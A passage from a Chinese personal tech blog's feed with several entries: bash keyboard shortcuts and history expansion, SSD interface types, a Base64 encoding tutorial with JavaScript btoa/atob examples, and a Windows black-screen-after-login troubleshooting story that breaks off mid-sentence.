Q</code></td><td>允许屏幕输出（阻止后恢复输出）</td></tr><tr><td><code>Ctrl + P</code>/<code>↑</code></td><td>切换上一条命令</td></tr><tr><td><code>Ctrl + N</code>/<code>↓</code></td><td>切换下一条命令</td></tr><tr><td><code>Shift + PageUp</code></td><td>向上翻页（历史记录）</td></tr><tr><td><code>Shift + PageDown</code></td><td>向下翻页</td></tr><tr><td><code>Ctrl + R</code></td><td>搜索历史记录（输入后立即在输入栏显示匹配项）</td></tr><tr><td><code>Ctrl + G</code></td><td>退出历史搜索（按 Esc 退出会保留匹配项）</td></tr></tbody></table><h2 id="特殊命令"><a href="#特殊命令" class="headerlink" title="特殊命令"></a>特殊命令</h2><p>以下命令可以避免重复输入冗长的命令；</p><table><thead><tr><th>快捷键</th><th>描述</th></tr></thead><tbody><tr><td><code>!!</code></td><td>获取上一条命令（会输出所执行的完整命令及其结果）</td></tr><tr><td><code>!xx</code></td><td>获取最近一条以 xx 开头的命令（xx 为任意字符）</td></tr><tr><td><code>!xx:p</code></td><td>类似 <code>!xx</code>，只是不会执行，只输出完整命令</td></tr><tr><td><code>!$</code></td><td>获取上一条命令的最后一个参数</td></tr><tr><td><code>!$:p</code></td><td>输出上一条命令的最后一个参数（不执行）</td></tr><tr><td><code>!*</code></td><td>获取上一条命令的所有参数</td></tr><tr><td><code>!*:p</code></td><td>输出上一条命令的所有参数（不执行）</td></tr><tr><td><code>^xy</code></td><td>执行上一条命令中删除了 xy （任意字符）后剩下的内容</td></tr><tr><td><code>^ab^xy</code></td><td>执行上一条命令中 ab 替换为 xy 后得到的内容（只替换第一个匹配项）</td></tr></tbody></table><p>参考链接：</p><blockquote><ul><li><a href="https://linuxtoy.org/archives/bash-shortcuts.html">https://linuxtoy.org/archives/bash-shortcuts.html</a></li><li><a href="https://github.com/hokein/Wiki/wiki/Bash-Shell%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE">https://github.com/hokein/Wiki/wiki/Bash-Shell%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE</a></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux shell 终端 快捷键 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>电脑固态硬盘接口辨析</title>
      <link href="/2024/09/27/cao-zuo-xi-tong/dian-nao-gu-tai-ying-pan-jie-kou-bian-xi/"/>
      <url>/2024/09/27/cao-zuo-xi-tong/dian-nao-gu-tai-ying-pan-jie-kou-bian-xi/</url>
      
        <content type="html"><![CDATA[<p>固态硬盘相比传统机械硬盘读写速度快许多，固态硬盘目前分为M.2接口与SATA接口。</p><h1 id="SATA接口"><a href="#SATA接口" class="headerlink" title="SATA接口"></a>SATA接口</h1><p>SATA（Serial ATA，Serial Advanced Technology Attachment，串行高级技术附件），一种硬盘接口规范。</p><p>SATA3是目前大多数笔记本使用的接口规范版本，尺寸比msata大一些，有个硬壳盒包装；</p><p>如下图，就是笔记本上取下的固态：</p><p><img src="https://i.loli.net/2018/12/08/5c0b60b71fa9c.jpg" alt="sata_one"><br><img src="https://i.loli.net/2018/12/08/5c0b60ae9c878.jpg" alt="sata_two"></p><p>PCI-E(PCI Express)新一代总线接口，取代PCI总线接口，称为第三代I/O总线技术，提高了带宽，PCI Express的接口根据总线位宽不同而有所差异，包括x1、x4、x8以及x16(x2)模式将用于内部接口而非插槽模式。</p><p><strong>PCI-E传输速度大于SATA。</strong></p><h1 id="M-2接口"><a href="#M-2接口" class="headerlink" title="M.2接口"></a>M.2接口</h1><p>M.2是intel推出替代mSATA(mini-SATA，小尺寸SATA规范接口，多应用于笔记本固态硬盘接口)的新接口规范，尺寸更小，传输性能更高，为满足超级本用户而推出；</p><p>M.2接口有两种类型：Socket 2（ngff）和Socket 3（nvme），Socket2支持SATA、PCI-E X2接口，PCI-E ×2接口标准，最大的读取速度可以达到700MB/s，写入达到550MB/s。Socket 3可支持PCI-E ×4接口，理论带宽达4GB/s。</p><p>NVME(Non-Volatile Memory express，非易失性内存主机控制器接口规范)，充分利用PCIE通道的低延时和并行性，降低AHCI的高延时和提高SATA的性能；</p><ul><li>NVME缺口靠右边，使用一缺固态;</li></ul><p><img src="https://i.loli.net/2018/12/08/5c0b60b31adf5.jpg" alt="m.2_1"><br><img src="https://i.loli.net/2018/12/08/5c0b60b4589e0.jpg" alt="m.2_0"></p><ul><li>NGFF缺口靠左边，使用两缺m.2固态;</li></ul><p><img src="https://i.loli.net/2018/12/08/5c0bbc1207a8b.jpg" alt="c3fb1290842eb6f7.jpg"></p><p>购买更换时需要注意主板插槽上缺口靠哪边，一般安装是固态条元器件面朝上。</p><p>并且，不要把它和内存条搞混，区别在于接口位置。</p>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 固态硬盘 SSD SATA M.2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Base64 码简介</title>
      <link href="/2024/09/27/bian-cheng/base64-ma-jian-jie/"/>
      <url>/2024/09/27/bian-cheng/base64-ma-jian-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>base64是一个保存二进制数据的工具，将多种形式的二进制数据或其构成的文件以ASCII的形式保存，因为很多地方不支持直接的二进制文件保存或呈现，比如可以将图片直接转换成base64码嵌入HTML文档中，而避免使用网络http加载图片。另外，将数据编码为 base64 进行传输，然后解码获得数据，可以一定程度上保证数据的完整并且不用在传输过程中修改这些数据，避免在传输过程中可能出现的问题；</p><h1 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h1><p><code>A-Z a-z 0-9 + /</code> 共64个字符(不信自己数一下);</p><h1 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h1><p>假设一个 .png 图片转换得到的base64码为 <code>abcdefg</code>，标准格式为：</p><pre class="line-numbers language-none"><code class="language-none">data:image&#x2F;png;base64,abcdefg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在浏览器地址栏输入以上字符串回车就能看见图片了，一般浏览器都支持解析base64码(里面的base64码换成自己的)；</p><p>或者用在html的 <code>img</code> 标签中：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>data:image/png;base64,abcdefg<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再或者用在markdown格式文本中：</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown"><span class="token url"><span class="token operator">!</span>[<span class="token content">base64</span>](<span class="token url">data:image/png;base64,abcdefg</span>)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以把 <code>data:</code> 看成像 <code>http:</code> 一样的一种协议，下面是其他格式，根据格式应该就能猜到其用途：</p><pre class="line-numbers language-none"><code class="language-none">data:,文本数据data:text&#x2F;plain,文本数据data:text&#x2F;html,HTML代码data:text&#x2F;html;base64,base64编码的HTML代码data:text&#x2F;css,CSS代码data:text&#x2F;css;base64,base64编码的CSS代码data:text&#x2F;javascript,Javascript代码data:text&#x2F;javascript;base64,base64编码的Javascript代码data:image&#x2F;gif;base64,base64编码的gif图片数据data:image&#x2F;png;base64,base64编码的png图片数据data:image&#x2F;jpeg;base64,base64编码的jpeg图片数据data:image&#x2F;x-icon;base64,base64编码的icon图片数据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>例如下面的星星图标：</p><p> <img src="data:image/jpeg;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAASCAQAAAD8x0bcAAAA2UlEQVR4AZWSAQZCQRCGv05QgXpQqCggukAgQeSpEwREoO4Qqg5RoYA6T6GqIIACvKqMMdZK9C1r5t+dmbE7/E+SKj26nz3BV9IseTlrSQqPHGc9jIjUOlPAIeBiGdZszD4SYCycMjXqjjdHifM0cUuMGAfzn8QRQnGGdAgpAlAipMNQgtsIfYnZkcUly070PsJAU18pg1LmquoAoWUdjEAZm9byG28AFSpA028cZioFTHkQMSGjysx/zBsnK3Li/tkvpHDI2wVb7MnjEbD6+cFGQkalZ6PyD2/u1Ikpara+FgAAAABJRU5ErkJggg==" alt="base64_img"></p><p> 其实它的base64码是这样的：</p> <pre class="line-numbers language-none"><code class="language-none">iVBORw0KGgoAAAANSUhEUgAAABIAAAASCAQAAAD8x0bcAAAA2UlEQVR4AZWSAQZCQRCGv05QgXpQqCggukAgQeSpEwREoO4Qqg5RoYA6T6GqIIACvKqMMdZK9C1r5t+dmbE7&#x2F;E+SKj26nz3BV9IseTlrSQqPHGc9jIjUOlPAIeBiGdZszD4SYCycMjXqjjdHifM0cUuMGAfzn8QRQnGGdAgpAlAipMNQgtsIfYnZkcUly070PsJAU18pg1LmquoAoWUdjEAZm9byG28AFSpA028cZioFTHkQMSGjysx&#x2F;zBsnK3Li&#x2F;tkvpHDI2wVb7MnjEbD6+cFGQkalZ6PyD2&#x2F;u1Ikpara+FgAAAABJRU5ErkJggg&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  为了显示方便所以进行了换行，理论上是很长的<strong>一行</strong>连续文本，中间不能有空格或者换行，这个图片仅有274字节(Byte)大，所以base64码还算短，几十上百K的图片就很长了，<strong>100K</strong>图片就有<strong>13万</strong>多个字符；</p><h1 id="转换原理"><a href="#转换原理" class="headerlink" title="转换原理"></a>转换原理</h1><p>base64 码的基本转换步骤如下：</p><ol><li><p>如果是图片直接转换成二进制文件，字符先转换成ASCII字符码，再转换成二进制；（网上直接搜“base64转换工具”就会出来很多在线转换网站，上传图片或者输入文本，一键转换）</p></li><li><p>将 base64 的64个字符按上面<strong>组成</strong>部分里讲到的顺序排列得到64个索引，索引从<strong>0</strong>开始，<strong>63</strong>结束；</p></li><li><p>因为 64 = 2^6，所以要使二进制包含64种不同情况，需要取6比特位，即<code>000000</code>这种，把之前文件转换得到的二进制数据按每<strong>6比特位</strong>取一次，然后得到一个6位二进制数再转换成相应十进制数，这个数就是索引，然后按照索引取相应的64字符中的某一个，最后把所有取得的字符连接就是base64码；</p></li><li><p>编码需要原文本总字节数(字符数)能<strong>被3整除</strong>(字节数除以3无余数)，因此取到最后的字符时如果凑不够，缺位全部用 <code>0</code> 补齐，最后的只要是<strong>全为0的6比特位</strong>，全部转换成字符 <strong><code>=</code>**，所以最多会出现</strong>2个 =**；</p></li></ol><p>以字符串 <code>Hello </code> 举例，后面类推，先将每个字符转换成ASCII码，再转换成二进制：</p><style>table th, table td {    border: 1px solid black;    text-align: center;}</style><table><thead><tr><th align="center">字符</th><th align="center">H</th><th align="center">e</th><th align="center">l</th><th align="center">l</th><th align="center">o</th><th align="center">空格</th></tr></thead><tbody><tr><td align="center"><strong>ASCII</strong></td><td align="center">72</td><td align="center">101</td><td align="center">108</td><td align="center">108</td><td align="center">111</td><td align="center">32</td></tr><tr><td align="center"><strong>二进制</strong></td><td align="center">01001000</td><td align="center">01100101</td><td align="center">01101100</td><td align="center">01101100</td><td align="center">01101111</td><td align="center">01000000</td></tr></tbody></table><p>再以字符串 <code>Hel</code> 为例，将二进制转化成base64码：</p><style>table th, table td {    border: 1px solid;    text-align: center;}</style><table style="text-align: center">    <tr>        <th>字符</th>        <th colspan="8">H</th>        <th colspan="8">e</th>        <th colspan="8">l</th>    </tr>    <tr>        <th>二进制</th>        <td>0</td><td>1</td><td>0</td><td>0</td>        <td>1</td><td>0</td><td>0</td><td>0</td>        <td>0</td><td>1</td><td>1</td><td>0</td>        <td>0</td><td>1</td><td>0</td><td>1</td>        <td>0</td><td>1</td><td>1</td><td>0</td>        <td>1</td><td>1</td><td>0</td><td>0</td>    </tr>    <tr>        <th>Base64补0</th>        <td>0</td><td>1</td><td>0</td><td>0</td>        <td>1</td><td>0</td><td>0</td><td>0</td>        <td>0</td><td>1</td><td>1</td><td>0</td>        <td>0</td><td>1</td><td>0</td><td>1</td>        <td>0</td><td>1</td><td>1</td><td>0</td>        <td>1</td><td>1</td><td>0</td><td>0</td>    </tr>    <tr>        <th>Base64结果</th>        <td colspan="6">S</td>        <td colspan="6">G</td>        <td colspan="6">V</td>        <td colspan="6">s</td>    </tr></table><p>上面是不用补码的情况，即字符总数是3的倍数；下面是最后剩两个字符需要补码的情况：</p><table style="text-align: center">    <tr>        <th>字符</th>        <th colspan="8">H</th>        <th colspan="8">e</th>        <th colspan="8"></th>    </tr>    <tr>        <th>二进制</th>        <td>0</td><td>1</td><td>0</td><td>0</td>        <td>1</td><td>0</td><td>0</td><td>0</td>        <td>0</td><td>1</td><td>1</td><td>0</td>        <td>0</td><td>1</td><td>0</td><td>1</td>        <td> </td><td> </td><td> </td><td> </td>        <td> </td><td> </td><td> </td><td> </td>    </tr>    <tr>        <th>Base64补0</th>        <td>0</td><td>1</td><td>0</td><td>0</td>        <td>1</td><td>0</td><td>0</td><td>0</td>        <td>0</td><td>1</td><td>1</td><td>0</td>        <td>0</td><td>1</td><td>0</td><td>1</td>        <th>0</th><th>0</th><th>0</th><th>0</th>        <th>0</th><th>0</th><th>0</th><th>0</th>    </tr>    <tr>        <th>Base64结果</th>        <td colspan="6">S</td>        <td colspan="6">G</td>        <td colspan="6">T</td>        <th colspan="6">=</th>    </tr></table><p>然后是最后只剩一个字符的例子：</p><table style="text-align: center">    <tr>        <th>字符</th>        <th colspan="8">H</th>        <th colspan="8"> </th>        <th colspan="8"> </th>    </tr>    <tr>        <th>二进制</th>        <td>0</td><td>1</td><td>0</td><td>0</td>        <td>1</td><td>0</td><td>0</td><td>0</td>        <td> </td><td> </td><td> </td><td> </td>        <td> </td><td> </td><td> </td><td> </td>        <td> </td><td> </td><td> </td><td> </td>        <td> </td><td> </td><td> </td><td> </td>    </tr>    <tr>        <th>Base64补0</th>        <td>0</td><td>1</td><td>0</td><td>0</td>        <td>0</td><td>0</td><td>0</td><td>0</td>        <th>0</th><th>0</th><th>0</th><th>0</th>        <th>0</th><th>0</th><th>0</th><th>0</th>        <th>0</th><th>0</th><th>0</th><th>0</th>        <th>0</th><th>0</th><th>0</th><th>0</th>    </tr>    <tr>        <th>Base64结果</th>        <td colspan="6">S</td>        <th colspan="6">A</th>        <th colspan="6">=</th>        <th colspan="6">=</th>    </tr></table><p><strong>值得注意</strong>的是 base64 码 <code>A</code> 的二进制也是 <code>000000</code>，上面例子中 <code>A</code> 的二进制码是部分补全后全为0，只有6个0全是补全的时候才都转换为字符 <code>=</code>；</p><p>对于图片文件，原理一样，因为图片文件也是一堆二进制数组成，只不过需要用特殊的编辑器查看，然后以同样的道理即可转换为 base64 码，这里就不赘述了；</p><h1 id="JavaScript实现转换"><a href="#JavaScript实现转换" class="headerlink" title="JavaScript实现转换"></a>JavaScript实现转换</h1><p>在 JavaScript 中，正好有这么两个函数可以实现对 base64 码的编码与解码，它们分别是 <code>atob()</code> 和 <code>btoa()</code>，可能光从名字上看会觉得它们的名字取有些随意，像 <strong>“a to b”</strong> 和 <strong>“b to a”**，不要误会，其实这是缩写，全称应该是 **”ascii to binary”**（即进行 base64 解码） 和 **”binary to ascii”**（即进行 base64 编码），其中 **ascii</strong> 指代数据经 base64 编码后的字符，而 <strong>binary</strong> 指代未经编码的原始数据，其实这里全称的含义其实就是 base64 码的功能所在，下面分别举例说明。</p><h2 id="btoa"><a href="#btoa" class="headerlink" title="btoa()"></a>btoa()</h2><p>该函数实现的是将数据编码为 base64 码，使用方法：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token function">btoa</span><span class="token punctuation">(</span><span class="token string">'Hello'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "SGVsbG8="</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>会发现这里的输出结果与上面的转换原理部分所得到的结果一致；</p><h2 id="atob"><a href="#atob" class="headerlink" title="atob()"></a>atob()</h2><p>该函数实现的是将经过 base64 编码后的字符解码为原始数据，使用方法：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token function">btoa</span><span class="token punctuation">(</span><span class="token string">'Hello'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 先将数据编码</span><span class="token keyword">var</span> b <span class="token operator">=</span> <span class="token function">atob</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 将编码后的字符解码</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "Hello"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>另外，如果尝试对非正常编码的字符执行解码操作的话，则会报错：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> b <span class="token operator">=</span> <span class="token function">atob</span><span class="token punctuation">(</span><span class="token string">'Hello'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Uncaught DOMException: Failed to execute 'atob' on 'Window': The string to be decoded is not correctly encoded.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> base64 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次Windows电脑开机登录后黑屏的问题分析与排查</title>
      <link href="/2024/09/27/cao-zuo-xi-tong/ji-yi-ci-windows-dian-nao-kai-ji-deng-lu-hou-hei-ping-de-wen-ti-fen-xi-yu-pai-cha/"/>
      <url>/2024/09/27/cao-zuo-xi-tong/ji-yi-ci-windows-dian-nao-kai-ji-deng-lu-hou-hei-ping-de-wen-ti-fen-xi-yu-pai-cha/</url>
      
        <content type="html"><![CDATA[<!--# 起因一阳光明媚的晌午，本人心情愉悦地摁下了笔记本的开机键后，略过了主板开机动画，熬过了 Windows 登录（win10 系统）的魔力转圈圈，最终却没能等来那昔日熟悉的桌面与亲切的图标们，直接映入眼帘的是下图：![black.png](https://i.loli.net/2020/05/19/8YkgFhcs3IzlSKb.png)嗯，就这样盯着它，10s...30s...1min...时间安静的流淌，内心也慢慢掀起了波澜，身经百战的心灵意识到不好的事情要发生了；Nice，人在家中坐，bug 天上来，不过黑屏给了我黑色的眼，我将用它来寻找问题。# 问题探索首先，调整好心态，冷静就有希望，慌乱就会败北（或者是像本人一样曾被无数 bug 折磨后的生死看淡？）问题总有会一些办法可以进行解决；然后就是寻找突破口了，这时下意识的晃了晃鼠标，然后熟悉的小光标出现了！但是还是背景一片黑，不过在这无边的黑暗中，这光标也算闪烁着唯一又弱小的希望的光芒；然后又是试探性的按了一下键盘的 `windows` 键，然后画风一变：![black-win-a.png](https://i.loli.net/2020/05/19/YzheBOKMX6roZLx.png)按 `win+a`也有反应，打开了侧边栏，证明系统已经加载完毕，按键都有作用，只是无法显示，于是一顿操作打开了个应用（盲开），等待数秒后没有反应，仍是一片黑，再次按下 win 键又确实看见了它已被打开，鼠标挪到任务栏位置看一下：![black-mouse-to-taskbar-window.png](https://i.loli.net/2020/05/19/qj9izT2xd8XSLJa.png)再开个应用，尝试使用 `alt+tab` 组合键切换应用：![black-switch-window.png](https://i.loli.net/2020/05/19/PdB8bTaRM3L4IDf.png)看来能够正常启动应用，然后尝试点开了任务栏一个应用（资源管理器），把鼠标挪到应用的任务栏缩略图后，出现了下面一幕：![black-mouse-to-taskbar-window.png](https://i.loli.net/2020/05/19/qj9izT2xd8XSLJa.png)咦这不是我那亲切的桌面嘛，居然以这种方式出现了，果然有戏，接下来再进一步发掘；**然而** 就在这时，桌面奇迹般的亮了，一切恢复如初，就像风不曾吹过，雨不曾下过，似一切都未曾发生过，难道是这般执著感化了 CPU ？开个玩笑，刚才没有执行特使的操作，应该是某种超时时间过了，桌面出现响应，不过看了看时间，算一下时间差大概有 3 分钟左右，果然这就是神奇的相对论，转瞬的时间有时可以变得很漫长；不过事情不会这样结束，接下来又是习惯性地重启了电脑，看一下问题是否会再现，一顿操作和等待后，电脑开机...登录...转圈圈...然后果然又是黑屏！无边的黑暗再次席卷覆盖整个显示屏，不过这一次就要想办法将其撕破了；# 问题分析根据前面的经历，这里黑屏应该也要持续 3 分钟左右，甚至更多，那么就不能干等着，于是开始盯着深邃的屏幕陷入沉思：问题出在 Windows 系统登录后（该系统设置了开机自动登录 Windows 账户），就是系统的 BOOT 引导已经结束，这样就排除了常见的开机黑屏现象，即按下 电源键后一直黑没多余反应那种，这就通常是硬件方面的问题，比如内存条接触不良等原因，目前就基本排除了这些原因；既然是系统启动后，并且执行完了登录操作，而没能正常显示桌面，那么问题就缩小（好像也不怎么小哈..）到了软件层面，比如系统服务，驱动，启动项等等；等等，启动项和桌面，好像想到了什么，因为一直在用一款桌面整理软件，从而避免脏乱差的视觉环境，同时就是设置开机启动，最近软件也更新了一下，难道是这个原因造成的桌面显示 bug ？不知不觉间桌面已经恢复显示了，于是按下 `Ctrl+Shift+Esc` 组合键调出任务管理器，点下 **启动** 栏，然后禁用该程序开机启动：![taskmgr-startup-disable.png](https://i.loli.net/2020/05/19/C6zbQEwVGThtvKM.png)随后马不停蹄地重启了电脑，然后，事实证明事情似乎没有想象中的简单，依然是熟悉的黑屏，到这里也没有特别的好招了，因为一般给别人解决问题时首先就是问最近干了啥，可能会发现线索，不过本人最近用计算机干的事情似乎有点多，系统到用户层面的各种，服务器、虚拟机、数据库等等，一时也想不出什么线索（甚至觉得盯着屏幕呼吸都是一种错 -_-），所以准备向搜索引擎寻求帮助或者找找启发；# 问题排查## 搜索解决方案一搜还确实有不少小伙伴有类似的经历，排除硬件故障无法开机的，有说更新驱动的，还不少，这种回答就一笑略过吧，这种方案很普遍也是有原因的，排除不愿相信硬件损坏的显示，就可以把大部分问题推到在软硬件之间打交道的驱动程序上了，其在过去确实能解决大部分问题，不过各厂商也都更新了这么多年了，驱动层面的问题现在应该很少了，而且本人电脑里的各个驱动都一直保持在最新状态，这个也排除了；另外也有提到取消 Windows 的快速启动功能的，也就是下面的步骤：![control-powercfg.png](https://i.loli.net/2020/05/19/Lk31UDeJMZuKlm5.png)![control-power-unlock.png](https://i.loli.net/2020/05/19/mi1H5A9jhswLk6Z.png)![control-power-uncheck.png](https://i.loli.net/2020/05/19/B18AiCrYSo9Elyn.png)不过经测试无效，所以排除；继续浏览，不出所料，处理和解决 Windows 大部分故障或问题的场景，几乎都能见到 **注册表** 的身影，不过确实注册表这东西和 Windows 系统关系相当紧密，你在 Windows 中执行的大部分可见甚至不可见的操作，几乎都一项注册表项值与之关联；关于注册表的解决方案中基本都提到修改同一个地方（大部分是让下载或者新建一个注册表文件，然后双击导入系统，其实大可不必这样复杂）：<pre class="line-numbers language-none"><code class="language-none">HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Class\&#123;4d36e968-e325-11ce-bfc1-08002be10318&#125;\0000HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Class\&#123;4d36e968-e325-11ce-bfc1-08002be10318&#125;\0001<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>即在这两项下都增加（不存在的话）一个名为 <code>EnableULPS</code> 的键，值为 <code>0</code>，类型为 <code>REG_DWORD</code>，就是如下图这样：</p><p><img src="https://i.loli.net/2020/05/19/CQ7hOsKvznlIdHa.png" alt="regedit-enableULPS.png"></p><p>不明觉厉，先重启试试……还真<strong>解决</strong>了！！但是由于职业精神，问题被莫名其妙的解决了还是有些不甘心，于是就继续深入分析下，上面的注册表操作其实就是把 <code>EnableULPS</code> 这个熟悉赋值为了 <code>0</code>，根据字面意思全部翻译过来就是禁用了 <strong><code>ULPS</code></strong> 这个功能，再搜索得知，其全称 <code>Ultra Low Power State（超低功率状态）</code>，这个似乎是 AMD 中的一个功能，下面是引用片段：</p><blockquote><p> AMD 显卡为了防止因为频率太高导致系统不稳定。所以在 AMD 显卡上推出了一个 ULPS 功能，就是用户无操作的时候自动降频，休眠，然后用于节电。想法是好的，但是有人用了导致黑屏。所以出了一个关闭此功能的工具，它可以用于检测这个功能的开关状态，并直接关掉。</p></blockquote><p>不过这个问题能在我的 Intel 中出现也是很迷；另外文章还有提到：</p><blockquote><ul><li>ULPS是休眠状态 ，降低非主卡的频率和电压的以节省电能，缺点就是可能会导致性能的损失和一些交火不稳定。</li><li>经常用电池的不建议关闭ULPS，因为关闭后显卡一直工作在独显状态。</li></ul></blockquote><p>细想以前似乎从未动过这个功能，这么冒然改好像有点简单粗暴，之后还可能会得不偿失，所以这个方案暂时存着，先找找其它方面的问题；</p><h2 id="自行排查"><a href="#自行排查" class="headerlink" title="自行排查"></a>自行排查</h2><h3 id="系统服务"><a href="#系统服务" class="headerlink" title="系统服务"></a>系统服务</h3><p>就像之前说的，搜索问题有时候并不能得到有效的解决方案，但是某些回复的解决手段或者思路是可以起到一定程度的启发作用的，比如某一条大致说的是排查系统服务的问题，确实，之前分析时把问题定位在系统层面，排查过了启动项，但是 <strong>服务</strong> 这一块还没测试，所以先打开 <code>msconfig</code>，<code>Win+R</code> 后输入：</p><p><img src="https://i.loli.net/2020/05/20/yec8OnPfowgRaqF.png" alt="msconfig-open.png"></p><p>然后进入服务模块：</p><p><img src="https://i.loli.net/2020/05/20/KgP5yZrG4AYoabQ.png" alt="msconfig-service.png"></p><p>这里列出的就是系统中的所有服务项，前面打勾代表已启用，否则是禁用，这里的思路就是先都禁用了，然后重启如果正常则挨个启用排查是哪一项服务的问题，当然这样工作量有点大，全部禁用也可能会出现额外的问题，所以可以先试试系统自带的诊断启动，会加载一些基本服务和设备，就是点击上图顶部最左侧的 <strong>常规</strong> 模块，然后选择 <strong>诊断启动</strong>：</p><p><img src="https://i.loli.net/2020/05/20/L3IlZ2dJMxRBubN.png" alt="msconfig-diagnose-boot.png"></p><p>点确定或应用后重启系统，这次就愉快又快速的进入系统桌面了（证明禁用不必要的服务确实能提高开机速度），不过也会发现某些模块无法使用，比如喇叭和屏幕亮度，甚至提示某些系统错误，很正常，因为只启用了基本服务，其它的系统服务和模块就没有加载，不过不影响问题排查就行了；</p><h3 id="系统日志"><a href="#系统日志" class="headerlink" title="系统日志"></a>系统日志</h3><p>当然，排查问题怎么少的了日志分析，可以起到一定辅助作用，于是这时就想起了 Windows 自家的法宝 <strong>事件查看器</strong>（由于平时也基本也怎么用过），平时用惯了 Linux 命令行分析日志，突然一切可视化了还不太习惯，先打开熟悉一下操作再说：</p><p><img src="https://i.loli.net/2020/05/20/rckZ8LMRA7YO6t9.png" alt="event-win-search.png"></p><p>点开 Windows 日志：</p><p><img src="https://i.loli.net/2020/05/20/VNi7eWsDgdE84GA.png" alt="eventlog-windows-log.png"></p><p>再看看包含事件的几项：</p><p><img src="https://i.loli.net/2020/05/20/lYFzVDdJ62CHBvj.png" alt="eventlog-app.png"></p><p><img src="https://i.loli.net/2020/05/20/KWTXPaz51S7picD.png" alt="eventlog-security.png"></p><p>这里由于分析问题可能是出在系统层面上，所以先关注 Windows 相关的事件，应用程序的暂且不管（其实也是因为点开它后发现应用数量有些庞大，不好找落脚点 ╮(╯▽╰)╭<br>），然后就是挨个进到每一项中，点击右侧操作栏的<strong>清除日志</strong>按钮把日志分别清空：</p><p><img src="https://i.loli.net/2020/05/20/e2TqM3rIoicgZRx.png" alt="eventlog-clear.png"></p><p>这样如果后续操作时问题复现了，就可以较精确的定位了；</p><h3 id="服务排查"><a href="#服务排查" class="headerlink" title="服务排查"></a>服务排查</h3><p>然后可以把事件查看器关闭，再次打开 <code>msconfig</code>，选择诊断启动，再切到服务模块，可以看到大部分服务都没有被勾选了，然后我们点一下“服务”这个表头，让项目按名称顺序排列，方便后续操作：</p><p><img src="https://i.loli.net/2020/05/20/HZ8UNyD95i6QRor.png" alt="msconfig-sort-by-name.png"></p><p>然后就是重点的排除环节了，这里大致数了一下，有 400 个左右的服务项，如果挨个勾选再重启检查的话，可能也就写不出这篇文章了，所以需要找一个高效的办法，之前搜索问题时也受到一位小伙伴的启发，可以使用 <strong>二分查找</strong> 法进行排除，这本来是算法中的一种解决方案，没想到被这样给实际应用了(～￣▽￣)～，这里通俗讲就是先勾选一半的服务项目，比如从第一条开始，一直勾选直到右侧滚动条运动到大概中点的位置（好像工作量也不小，看手速咯），前面已经对服务名称进行过排序，所以这里前半部分服务大致是字母开头是 <code>A - P</code> 的服务项：</p><p><img src="https://i.loli.net/2020/05/20/NxIhDsUypc31LbE.png" alt="msconfig-check-a-p.png"></p><p>重启系统后正常进入桌面，证明问题不在勾选的前半部分服务项中，可以排除掉，接下来我们再把剩下的没有勾选的服务项，勾选它们的前半部分，也就是说现在还有总量的最后四分之一部分没有被勾选，这样排除确实挺快，然后就是清除全部 Windows 日志，重启，再重复这些工作，直到问题复现（登录黑屏）；</p><p>于是乎在进行到 <code>W</code> 